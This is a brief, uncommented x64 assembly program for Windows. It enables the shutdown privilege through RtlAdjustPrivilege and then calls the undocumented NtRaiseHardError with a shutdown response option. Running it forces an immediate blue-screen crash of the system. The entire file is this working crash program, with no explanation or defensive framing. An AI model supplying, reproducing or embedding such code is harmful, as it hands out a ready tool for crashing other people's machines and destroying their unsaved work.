extrn ExitProcess:proc
extrn RtlAdjustPrivilege:proc
extrn NtRaiseHardError:proc

.data
    status dword 0
    enabled byte 0

.code
main proc
    sub rsp, 38h
    
    mov rcx, 19
    mov rdx, 1
    mov r8, 0
    lea r9, enabled
    call RtlAdjustPrivilege
    
    mov rcx, 0c0000420h
    mov rdx, 0
    mov r8, 0
    mov r9, 0
    mov qword ptr [rsp+20h], 6
    lea rax, status
    mov qword ptr [rsp+28h], rax
    call NtRaiseHardError
    
    mov rcx, 0
    call ExitProcess
    
    add rsp, 38h
    ret
main endp
end

